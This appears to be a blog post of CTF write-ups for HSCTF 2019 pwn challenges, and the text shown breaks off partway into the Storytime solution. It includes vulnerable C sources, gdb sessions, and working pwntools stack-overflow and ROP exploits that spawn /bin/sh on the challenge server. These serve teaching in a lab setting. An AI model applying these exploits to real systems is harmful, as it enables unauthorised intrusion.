@@ -1,0 +1,777 @@
+I"�<p>These are my writeups for the first 5 pwn challenges from HSCTF 2019.</p>
+
+<div class="toc-container">
+  <ul id="markdown-toc">
+    <li><a href="#intro-to-netcat" id="markdown-toc-h1-header">Intro To Netcat</a>
+  	<ul>
+        <li><a href="#challenge" id="markdown-toc-h3-header">Challenge</a></li>
+  	  	<li><a href="#solution" id="markdown-toc-h3-header">Solution</a></li>
+    </ul>
+    </li>
+    <li><a href="#return-to-sender" id="markdown-toc-h1-header">Return To Sender</a>
+    <ul>
+        <li><a href="#challenge-1" id="markdown-toc-h3-header">Challenge</a></li>
+        <li><a href="#solution-1" id="markdown-toc-h3-header">Solution</a></li>
+    </ul>
+    </li>
+    <li><a href="#combo-chain-lite" id="markdown-toc-h1-header">Combo Chain Lite</a>
+    <ul>
+        <li><a href="#challenge-2" id="markdown-toc-h3-header">Challenge</a></li>
+        <li><a href="#solution-2" id="markdown-toc-h3-header">Solution</a></li>
+    </ul>
+    </li>
+    <li><a href="#storytime" id="markdown-toc-h1-header">Storytime</a>
+    <ul>
+        <li><a href="#challenge-3" id="markdown-toc-h3-header">Challenge</a></li>
+        <li><a href="#solution-3" id="markdown-toc-h3-header">Solution</a></li>
+    </ul>
+    </li>
+    <li><a href="#combo-chain" id="markdown-toc-h1-header">Combo Chain</a>
+    <ul>
+        <li><a href="#challenge-4" id="markdown-toc-h3-header">Challenge</a></li>
+        <li><a href="#solution-4" id="markdown-toc-h3-header">Solution</a></li>
+    </ul>
+    </li>
+  </ul>
+</div>
+
+<h1 id="intro-to-netcat">Intro To Netcat</h1>
+
+<h3 id="challenge">Challenge</h3>
+
+<blockquote>
+  <p>Written by: Ptomerty</p>
+
+  <p>Hey there! This challenge is a quick introduction to netcat and how to use it. Netcat is a program that will help you “talk” with many of our challenges, especially pwn and misc. To begin, Windows users should download this file: https://drive.google.com/open?id=1Z8MS8SZYqZrteXOVPRL7BHwB4JL9t9J8</p>
+
+  <p>Extract the file, then open a command prompt and navigate to the directory using <code class="highlighter-rouge">cd &lt;download-directory&gt;</code>. From there, you can run <code class="highlighter-rouge">nc misc.hsctf.com 1111</code> to get your first flag.</p>
+
+  <p>Have fun!</p>
+</blockquote>
+
+<h3 id="solution">Solution</h3>
+
+<p>A very simple challenge.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>» nc misc.hsctf.com 1111
+Hey, here's your flag! hsctf{internet_cats}
+</code></pre></div></div>
+
+<p>Flag: <code class="highlighter-rouge">hsctf{internet_cats}</code></p>
+
+<h1 id="return-to-sender">Return To Sender</h1>
+
+<h3 id="challenge-1">Challenge</h3>
+
+<blockquote>
+  <p>Written by: Ptomerty</p>
+
+  <p>Who knew the USPS could lose a letter so many times?</p>
+
+  <p>nc pwn.hsctf.com 1234</p>
+
+  <p>Note: If you’re trying to use python or a similar program to run your exploit, make sure to keep stdin alive with cat, like this: (python; cat -) | nc pwn.hsctf.com <port></port></p>
+</blockquote>
+
+<p>The challenge archive contains the following files.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>return-to-sender
+return-to-sender.c
+</code></pre></div></div>
+
+<h3 id="solution-1">Solution</h3>
+
+<p>This was a simple binary exploitation challenge that involved overflowing a buffer on the stack to change a return address.</p>
+
+<p>The vulnerable code is shown below.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// gcc return-to-sender.c -o return-to-sender -m32 -no-pie -g0 -fno-stack-protector</span>
+
+<span class="cp">#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdio.h&gt;
+</span>
+<span class="kt">void</span> <span class="nf">win</span><span class="p">()</span> <span class="p">{</span>
+  <span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">vuln</span><span class="p">()</span> <span class="p">{</span>
+  <span class="kt">char</span> <span class="n">dest</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Where are you sending your mail to today? "</span><span class="p">);</span>
+  <span class="n">gets</span><span class="p">(</span><span class="n">dest</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Alright, to %s it goes!</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">dest</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+  <span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+  <span class="n">gid_t</span> <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
+  <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span><span class="n">gid</span><span class="p">,</span><span class="n">gid</span><span class="p">);</span>
+  <span class="n">vuln</span><span class="p">();</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>The <code class="highlighter-rouge">vuln()</code> function calls <code class="highlighter-rouge">gets()</code> to get user input. The <code class="highlighter-rouge">gets()</code> function performs zero bounds checking on the user input, thus we can input as many characters as we want to overflow the <code class="highlighter-rouge">dest</code> buffer. In this case, we have to do a controlled buffer overflow so that we gain control of the return pointer of <code class="highlighter-rouge">vuln()</code>, which will then allow us to point it to the <code class="highlighter-rouge">win()</code> function and get a shell.</p>
+
+<p>Let’s run <code class="highlighter-rouge">checksec</code> on the binary.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>» checksec <span class="k">return</span><span class="nt">-to-sender</span>                                                                     
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/home/faithlesss/Documents/ctfs/hsctf-6/pwn/return-to-sender/bin/return-to-sender'</span>
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE <span class="o">(</span>0x8048000<span class="o">)</span>
+</code></pre></div></div>
+
+<p>We see that there is no stack canary (and therefore no protection to a buffer overflow attack), no ASLR (Address Space Layout Randomization), and the stack is Not Executable (NX).</p>
+
+<p>First, we have to show that the program indeed does crash when a huge string is passed to it.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>» ./return-to-sender                                                                            
+Where are you sending your mail to today? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
+Alright, to AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa it goes!
+<span class="o">[</span>1]    30852 segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>  ./return-to-sender
+</code></pre></div></div>
+
+<p>We’ve successfully crashed the program. Let’s start gdb and see exactly what happened.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>» gdb ./return-to-sender                                                                        
+Reading symbols from ./return-to-sender...
+<span class="o">(</span>No debugging symbols found <span class="k">in</span> ./return-to-sender<span class="o">)</span>
+<span class="o">(</span>gdb<span class="o">)</span> run
+Starting program: /home/faithlesss/Documents/ctfs/hsctf-6/pwn/return-to-sender/bin/return-to-sender
+BFD: warning: /lib/ld-linux.so.2: corrupt GNU_PROPERTY_TYPE <span class="o">(</span>5<span class="o">)</span> size: 0
+BFD: warning: /lib/ld-linux.so.2: corrupt GNU_PROPERTY_TYPE <span class="o">(</span>5<span class="o">)</span> size: 0
+BFD: warning: /lib/ld-linux.so.2: corrupt GNU_PROPERTY_TYPE <span class="o">(</span>5<span class="o">)</span> size: 0
+Where are you sending your mail to today? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Alright, to AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA it goes!
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 <span class="k">in</span> ?? <span class="o">()</span>
+<span class="o">(</span>gdb<span class="o">)</span>
+
+</code></pre></div></div>
+
+<p>At the bottom, we can see that it receives a seg fault when trying to access memory location <code class="highlighter-rouge">0x41414141</code>. <code class="highlighter-rouge">0x41</code> is the ascii hex value of ‘A’, thus we overwrote the return pointer with four ‘A’s, which meant that after the <code class="highlighter-rouge">vuln()</code> function finished, it tried to return into <code class="highlighter-rouge">0x41414141</code>.</p>
+
+<p>Now, we have to figure out the offset at which we control the return pointer (i.e, how many A’s can we enter before we can enter BBBB and set the return pointer to 0x42424242?). I use metasploit’s <code class="highlighter-rouge">pattern_create.rb</code> to generate a unique pattern of 200 characters, then pass it to gdb.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>» pattern_create <span class="nt">-l</span> 200               
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+
+» gdb ./return-to-sender
+Reading symbols from ./return-to-sender...
+<span class="o">(</span>No debugging symbols found <span class="k">in</span> ./return-to-sender<span class="o">)</span>
+<span class="o">(</span>gdb<span class="o">)</span> run
+Starting program: /home/faithlesss/Documents/ctfs/hsctf-6/pwn/return-to-sender/bin/return-to-sender
+BFD: warning: /lib/ld-linux.so.2: corrupt GNU_PROPERTY_TYPE <span class="o">(</span>5<span class="o">)</span> size: 0
+BFD: warning: /lib/ld-linux.so.2: corrupt GNU_PROPERTY_TYPE <span class="o">(</span>5<span class="o">)</span> size: 0
+BFD: warning: /lib/ld-linux.so.2: corrupt GNU_PROPERTY_TYPE <span class="o">(</span>5<span class="o">)</span> size: 0
+Where are you sending your mail to today? Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+Alright, to Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag it goes!
+
+Program received signal SIGSEGV, Segmentation fault.
+0x37614136 <span class="k">in</span> ?? <span class="o">()</span>
+<span class="o">(</span>gdb<span class="o">)</span>
+
+</code></pre></div></div>
+
+<p>Alright, now we get a seg fault at <code class="highlighter-rouge">0x37614136</code>. I then use metasploit’s <code class="highlighter-rouge">pattern_offset.rb</code> to find at which offset the crash occurred.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>» pattern_offset <span class="nt">-l</span> 200 <span class="nt">-q</span> 37614136                                                             
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Exact match at offset 20
+</code></pre></div></div>
+
+<p>Now we know that after inputting 20 ‘A’s, the next four bytes that we input will overwrite the return pointer. Now, what we want to do is execute the <code class="highlighter-rouge">win()</code> function and get a shell. This means that the return pointer just needs to be overwritten with the address of the <code class="highlighter-rouge">win()</code> function. I wrote up a python script using pwntools that does just that.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
+</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="c1"># Connect to the process on the remote ip and port
+</span><span class="n">connection</span> <span class="o">=</span> <span class="n">connect</span><span class="p">(</span><span class="s">"pwn.hsctf.com"</span><span class="p">,</span> <span class="mi">1234</span><span class="p">)</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./return-to-sender"</span><span class="p">)</span>
+
+<span class="n">win_addr</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'win'</span><span class="p">])</span> <span class="c1"># The address of the win function
+</span>
+<span class="n">padding</span> <span class="o">=</span> <span class="s">'A'</span><span class="o">*</span><span class="mi">20</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">padding</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">win_addr</span>
+
+<span class="c1"># Receive the starting text, then send the payload through
+</span><span class="n">connection</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="n">connection</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="c1"># Make the connection interactive since win() opens a shell for us
+</span><span class="n">connection</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="n">connection</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>The exploit basically connects to the ip and port given to us in the challenge, and sends 20 A’s, followed by the address of the <code class="highlighter-rouge">win()</code> function. The address overwrite’s the return pointer of <code class="highlighter-rouge">vuln()</code>.
+What this will do is it will cause the <code class="highlighter-rouge">vuln()</code> function to jump to the <code class="highlighter-rouge">win()</code> function instead of back to the <code class="highlighter-rouge">main()</code> function after it has finished executing.</p>
+
+<p>Running the exploit gives us a shell, which we then use to get the flag:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>» python exploit.py
+<span class="o">[</span>+] Opening connection to pwn.hsctf.com on port 1234: Done
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/home/faithlesss/Documents/ctfs/hsctf-6/pwn/return-to-sender/bin/return-to-sender'</span>
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE <span class="o">(</span>0x8048000<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Switching to interactive mode
+Alright, to AAAAAAAAAAAAAAAAAAAA<span class="se">\x</span>b6<span class="se">\x</span>91<span class="se">\x</span>0 it goes!
+<span class="nv">$ </span><span class="nb">ls
+</span>bin
+dev
+flag
+lib
+lib32
+lib64
+<span class="k">return</span><span class="nt">-to-sender</span>
+<span class="k">return</span><span class="nt">-to-sender</span>.c
+<span class="nv">$ </span><span class="nb">cat </span>flag
+hsctf<span class="o">{</span>fedex_dont_fail_me_now<span class="o">}</span>
+<span class="nv">$ </span> 
+</code></pre></div></div>
+
+<p>Flag: <code class="highlighter-rouge">hsctf{fedex_dont_fail_me_now}</code></p>
+
+<h1 id="combo-chain-lite">Combo Chain Lite</h1>
+
+<h3 id="challenge-2">Challenge</h3>
+
+<blockquote>
+  <p>Written by: Ptomerty</p>
+
+  <p>Training wheels!</p>
+
+  <p>Hint: What’s a ROP?</p>
+
+  <p><code class="highlighter-rouge">nc pwn.hsctf.com 3131</code></p>
+</blockquote>
+
+<p>The challenge archive contains the following files.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>combo-chain-lite
+combo-chain-lite.c
+</code></pre></div></div>
+
+<h3 id="solution-2">Solution</h3>
+
+<p>We are given the combo-chain-lite.c source file.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="mi">1</span> <span class="err">#</span><span class="n">include</span> <span class="o">&lt;</span><span class="n">stdlib</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
+  <span class="mi">2</span> <span class="err">#</span><span class="n">include</span> <span class="o">&lt;</span><span class="n">string</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
+  <span class="mi">3</span> <span class="err">#</span><span class="n">include</span> <span class="o">&lt;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
+  <span class="mi">4</span>
+  <span class="mi">5</span> <span class="kt">void</span> <span class="nf">vuln</span><span class="p">()</span> <span class="p">{</span>
+  <span class="mi">6</span>     <span class="kt">char</span> <span class="n">dest</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
+  <span class="mi">7</span>     <span class="n">printf</span><span class="p">(</span><span class="s">"Here's your free computer: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">system</span><span class="p">);</span>
+  <span class="mi">8</span>     <span class="n">printf</span><span class="p">(</span><span class="s">"Dude you hear about that new game called /bin/sh"</span><span class="p">);</span>
+  <span class="mi">9</span>     <span class="n">printf</span><span class="p">(</span><span class="s">"? Enter the right combo for some COMBO CARNAGE!: "</span><span class="p">);</span>
+ <span class="mi">10</span>     <span class="n">gets</span><span class="p">(</span><span class="n">dest</span><span class="p">);</span>
+ <span class="mi">11</span> <span class="p">}</span>
+ <span class="mi">12</span>
+ <span class="mi">13</span> <span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+ <span class="mi">14</span>     <span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+ <span class="mi">15</span>     <span class="n">gid_t</span> <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
+ <span class="mi">16</span>     <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span><span class="n">gid</span><span class="p">,</span><span class="n">gid</span><span class="p">);</span>
+ <span class="mi">17</span>     <span class="n">vuln</span><span class="p">();</span>
+ <span class="mi">18</span>     <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+ <span class="mi">19</span> <span class="p">}</span>
+</code></pre></div></div>
+
+<p>Very obvious buffer overflow in the vuln() function. The challenge also tells us we have to do a ROP chain to solve this.</p>
+
+<p>Run a quick checksec on the binary.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>» checksec ./combo-chain-lite
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/root/Documents/hsctf-6/pwn/combo-chain-lite/bin/combo-chain-lite'</span>
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
+</code></pre></div></div>
+
+<p>This is a very easy ROP challenge. If you are unfamiliar with how ROP works, you can learn more about it from my writeups of the ROP Emporium challenges <a href="/pwn/2019/07/19/rop-emporium-challenges.html" target="blank">here</a>, specifically split64, although you may have to read the previous writeups if you are very new to binary exploitation.</p>
+
+<p>The exploit is shown below. system’s address is given to us every run, and since the /bin/sh address is hardcoded in the binary, we can just get it out of the binary.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="mi">1</span> <span class="c1">#!/usr/bin/env python
+</span>  <span class="mi">2</span>
+  <span class="mi">3</span> <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+  <span class="mi">4</span>
+  <span class="mi">5</span> <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'critical'</span>
+  <span class="mi">6</span> <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./combo-chain-lite"</span><span class="p">)</span>
+  <span class="mi">7</span> <span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"pwn.hsctf.com"</span> <span class="mi">3131</span><span class="p">)</span>
+  <span class="mi">8</span> <span class="n">a</span> <span class="o">=</span> <span class="n">sh</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+  <span class="mi">9</span>
+ <span class="mi">10</span> <span class="n">system_addr</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">a</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">": "</span><span class="p">)[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">))</span>
+ <span class="mi">11</span> <span class="n">binsh_gen</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">)</span> <span class="c1"># Creates a generator object
+</span> <span class="mi">12</span> <span class="n">binsh_addr</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">binsh_gen</span><span class="p">))</span> <span class="c1"># Gets the next address of /bin/sh
+</span> <span class="mi">13</span> <span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000401273</span><span class="p">)</span>
+ <span class="mi">14</span>
+ <span class="mi">15</span> <span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">16</span> <span class="c1"># Overflow until RIP
+</span> <span class="mi">16</span> <span class="n">payload</span> <span class="o">+=</span> <span class="n">pop_rdi</span> <span class="c1"># Jump to the pop rdi; ret; gadget
+</span> <span class="mi">17</span> <span class="n">payload</span> <span class="o">+=</span> <span class="n">binsh_addr</span> <span class="c1"># Pop this into rdi
+</span> <span class="mi">18</span> <span class="n">payload</span> <span class="o">+=</span> <span class="n">system_addr</span> <span class="c1"># Jump to system('/bin/sh')
+</span> <span class="mi">19</span>
+ <span class="mi">20</span> <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">": "</span><span class="p">)</span>
+ <span class="mi">21</span> <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+ <span class="mi">22</span> <span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+ <span class="mi">23</span>
+ <span class="mi">24</span> <span class="n">sh</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>We get a shell.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>» python exploit.py
+<span class="nv">$ </span><span class="nb">ls
+</span>combo-chain-lite  combo-chain-lite.c  exploit.py  flag
+<span class="nv">$ </span><span class="nb">cat </span>flag
+hsctf<span class="o">{</span>wheeeeeee_that_was_fun<span class="o">}</span>
+<span class="nv">$ </span> 
+</code></pre></div></div>
+
+<p>Flag: <code class="highlighter-rouge">hsctf{wheeeeeee_that_was_fun}</code></p>
+
+<h1 id="storytime">Storytime</h1>
+
+<h3 id="challenge-3">Challenge</h3>
+
+<blockquote>
+  <p>Written by: Tux</p>
+
+  <p>I want a story!!!</p>
+
+  <p><code class="highlighter-rouge">nc pwn.hsctf.com 3333</code></p>
+</blockquote>
+
+<p>The challenge archive contains the following files.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>storytime
+storytime.c
+</code></pre></div></div>
+
+<h3 id="solution-3">Solution</h3>
+
+<p>First we take a look at the source code.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+</span>
+<span class="kt">void</span> <span class="nf">beginning</span><span class="p">(){</span>
+        <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"Once upon a time...</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="mi">40</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">middle</span><span class="p">(){</span>
+        <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"Middle of story is the best! :D</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="mi">40</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">end</span><span class="p">(){</span>
+        <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"The End!</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="mi">40</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">climax</span><span class="p">(){</span>
+        <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">40</span><span class="p">];</span>
+        <span class="k">return</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">4000</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">48</span><span class="p">];</span>
+
+    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"HSCTF PWNNNNNNNNNNNNNNNNNNNN</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="mi">29</span><span class="p">);</span>
+    <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"Tell me a story: </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="mi">18</span><span class="p">);</span>
+    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">400</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>A bunch of reads and writes. Let’s run file and checksec against the binary.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>» file ./storytime  
+./storytime: ELF 64-bit LSB executable, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="k">for </span>GNU/Linux 3.2.0, BuildID[sha1]<span class="o">=</span>3f716e7aa7e236824c52ed0410c1f14739919822, not stripped
+
+» checksec ./storytime
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/root/Documents/hsctf-6/pwn/storytime/bin/storytime'</span>
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Okay so no PIE and dynamically linked. let’s fire up gdb and see if we have a PLT entry for system(). If we have that, we can just use that to call system(‘/bin/sh’) and get a shell.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>» gdb ./storytime
+GEF <span class="k">for </span>linux ready, <span class="nb">type</span> <span class="sb">`</span>gef<span class="s1">' to start, `gef config'</span> to configure
+80 commands loaded <span class="k">for </span>GDB 8.2.1 using Python engine 3.7
+Reading symbols from ./storytime...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
+gef➤  print <span class="s1">'system@plt'</span>
+No symbol table is loaded.  Use the <span class="s2">"file"</span> command.
+gef➤  
+</code></pre></div></div>
+
+<p>No PLT entry. I quickly wrote a script to leak the libc address of the read() function since that does have a PLT entry. This requires knowing how the Procedural Linkage Table (PLT) and the Global Offset Table (GOT) work. For more information, see <a href="https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html">this</a>.</p>
+
+<p>Basically, if you have a dynamically linked file (such as the one we have now), whenever you call a function, you use its entry from the PLT table. This entry contains a <code class="highlighter-rouge">jmp</code> instruction to the GOT table entry of that specific function. If this is the first time this function is being called, the program goes through a whole process to find the address of this function in the libc libary being used for the process. Once it’s done that, it overwrites that GOT entry with this address from libc, so all subsequent calls jump straight there instead of having to re-lookup the address every time.</p>
+
+<p>Since we know read() has been called already (because we are passing input to it through read()), it means that if we print the address of read@got (i.e read’s GOT entry), we will leak the address of read() from the libc library that is in use.</p>
+
+<p>I simplified the above explanation a bit to save space, so I recommend reading more about it by following the link above (or just googling it by yourself)</p>
+
+<p>The script is shown below.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python2
+</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">BINARY</span> <span class="o">=</span> <span class="s">'./storytime'</span>
+
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'critical'</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">BINARY</span><span class="p">)</span>
